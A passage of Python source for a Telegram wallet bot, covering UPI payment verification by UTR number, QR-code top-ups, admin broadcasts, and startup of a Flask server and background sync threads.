                    "Contact Admin if you need assistance.",
                    reply_markup=back_markup(),
                    parse_mode="Markdown"
                )
            except Exception:
                await update.message.reply_text(
                    f"❌ No successful payment found for UTR: {clean_utr}. Please make sure you entered the correct 12-digit UTR and try again.",
                    reply_markup=back_markup()
                )
            return

        claim_key = payment.get("biz_order_id") or clean_utr
        ok, msg = pay_claim(claim_key, uid)
        if not ok:
            ok, msg = pay_claim(clean_utr, uid)

        if not ok:
            states.pop(uid, None)
            try:
                await wait_msg.edit_text(
                    "╔════════════════════╗\n"
                    "  ❌ UTR Already Used\n"
                    "╚════════════════════╝\n\n"
                    f"{msg}\nEach payment UTR can only be claimed once.",
                    reply_markup=back_markup()
                )
            except Exception:
                await update.message.reply_text(
                    f"❌ UTR Already Used: {msg}",
                    reply_markup=back_markup()
                )
            return

        amount = float(payment.get("amount", 0))
        await add_balance(uid, amount)
        final_user = await get_user(uid, name=tg_name, username=tg_username)

        try:
            await notify_admin(
                f"🔔 *Payment Verified & Added!*\n\n"
                f"👤 *User:* {tg_name} (@{tg_username})\n"
                f"🆔 *UID:* `{uid}`\n"
                f"💰 *Amount:* ₹{amount:.2f}\n"
                f"🧾 *UTR:* `{clean_utr}`\n"
                f"🏦 *Payer:* {payment.get('payer_name', '-')}\n"
                f"💳 *New Balance:* ₹{final_user['balance']:.2f}"
            )
        except Exception as e:
            log.warning("Admin notify error: %s", e)

        states.pop(uid, None)
        try:
            await wait_msg.edit_text(
                "╔════════════════════╗\n"
                "  ✅ Payment Verified!\n"
                "╚════════════════════╝\n\n"
                f"💰 *Amount:* ₹{amount:.2f}\n"
                f"🧾 *UTR:* `{clean_utr}`\n"
                f"💳 *New Balance:* ₹{final_user['balance']:.2f}\n\n"
                "Funds added to wallet instantly!",
                reply_markup=back_markup(),
                parse_mode="Markdown"
            )
        except Exception:
            await update.message.reply_text(
                f"✅ Payment Verified! Added ₹{amount:.2f} to wallet. New Balance: ₹{final_user['balance']:.2f}",
                reply_markup=back_markup()
            )
        return
        states.pop(uid, None)
        return



    # ── TOPUP CUSTOM ──

    if step == "topup_amount":

        try:

            amount = float(text)

            min_dep = float(settings_cache.get("min_deposit", "50"))

            if amount <= 0:

                raise ValueError

            if amount < min_dep:

                await update.message.reply_text(

                    f"╔════════════════════╗\n"

                    f"  ⚠️ Below Minimum\n"

                    f"╚════════════════════╝\n\n"

                    f"Minimum deposit: ₹{min_dep:.0f}\n"

                    f"You entered: ₹{amount:.2f}\n\n"

                    f"Enter ₹{min_dep:.0f} or more:",

                    reply_markup=back_markup(),

                )

                return

        except ValueError:

            await update.message.reply_text(

                "╔════════════════════╗\n"

                "  ⚠️ Invalid Amount\n"

                "╚════════════════════╝\n\n"

                "Enter a valid number:",

                reply_markup=back_markup(),

            )

            return

        paytm_vpa = settings_cache.get("paytm_vpa", "paytm.s2fqznb@pty")

        states.pop(uid, None)

        qr_buf = generate_upi_qr(amount, paytm_vpa)

        text = (

            "╔════════════════════╗\n"

            "  💸 Payment Step\n"

            "╚════════════════════╝\n\n"

            f"Scan QR or send *₹{amount:.2f}* to:\n\n"

            f"UPI ID: `{paytm_vpa}`\n\n"

            "After payment, enter your UTR number."

        )

        kb = [[InlineKeyboardButton("✏ Enter UTR", callback_data="vutr")], [InlineKeyboardButton("◀ Back", callback_data="back")]]

        await update.message.reply_photo(

            photo=qr_buf,

            caption=text,

            reply_markup=InlineKeyboardMarkup(kb),

            parse_mode="Markdown",

        )

        return



    # ── ADMIN BROADCAST ──

    if step == "a_bcast" and is_admin(uid):

        users = await get_all_users()

        sent_count = 0

        for u in users:

            try:

                await context.bot.send_message(int(u["user_id"]), f"📢 Broadcast:\n\n{text}")

                sent_count += 1

            except Exception:

                continue

        await update.message.reply_text(

            "╔════════════════════╗\n"

            "  📢 Broadcast Sent\n"

            "╚════════════════════╝\n\n"

            f"Delivered to {sent_count}/{len(users)} users.",

            reply_markup=back_markup(),

        )

        states.pop(uid, None)

        return





# ─── MAIN  ────────────────────────────────────────────────────────────────





async def post_init(app: Application):

    global panel_manager

    await init_db()

    await load_settings()

    panel_manager = PanelManager()

    await panel_manager.init()



    await app.bot.set_my_commands([

        BotCommand("start", "Main menu"),

        BotCommand("help", "Help"),

        BotCommand("admin", "Admin panel"),

        BotCommand("refresh", "Refresh panels (admin)"),

    ])

    log.info("Bot started. Panels: %d working", len(panel_manager.working))





async def post_shutdown(app: Application):

    global pool, redis_client

    if pool:

        await pool.close()

    if redis_client:

        await redis_client.close()

    log.info("Shutdown complete")





def start_flask():

    """Run Flask web server in a background thread."""

    try:

        init_web_db()

    except Exception as e:

        log.warning("Web DB init skipped: %s", e)

    flask_port = int(os.getenv("PORT", os.getenv("EXPOSED_PORT", "5050")))

    log.info("Starting Flask web server on port %d...", flask_port)

    app.run(host="0.0.0.0", port=flask_port, debug=False, use_reloader=False)





def main():

    global bot_application

    flask_thread = threading.Thread(target=start_flask, daemon=True)

    flask_thread.start()

    log.info("Flask web server started in background thread")



    probe_thread = threading.Thread(target=_background_probe_loop, daemon=True)

    probe_thread.start()

    log.info("Background probe started (50 workers, 30s interval)")

    def _background_paytm_loop():
        time.sleep(5)
        while True:
            try:
                synced = sync_paytm_recent_orders_sync(days=3)
                if synced > 0:
                    log.info("Paytm auto-synced %d orders", synced)
            except Exception as e:
                log.warning("Paytm background sync error: %s", e)
            time.sleep(60)

    paytm_thread = threading.Thread(target=_background_paytm_loop, daemon=True)
    paytm_thread.start()
    log.info("Background Paytm auto-sync started (60s interval)")



    application = (

        Application.builder()

        .token(BOT_TOKEN)

        .post_init(post_init)

        .post_shutdown(post_shutdown)

        .build()

    )

    bot_application = application



    application.add_handler(CommandHandler("start", cmd_start))

    application.add_handler(CommandHandler("help", cmd_help))

    application.add_handler(CommandHandler("admin", cmd_admin))

    application.add_handler(CommandHandler("refresh", cmd_refresh))

    application.add_handler(CallbackQueryHandler(cb_handler))

    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, msg_handler))



    log.info("Starting Telegram bot polling...")

    application.run_polling(drop_pending_updates=True)





if __name__ == "__main__":

    main()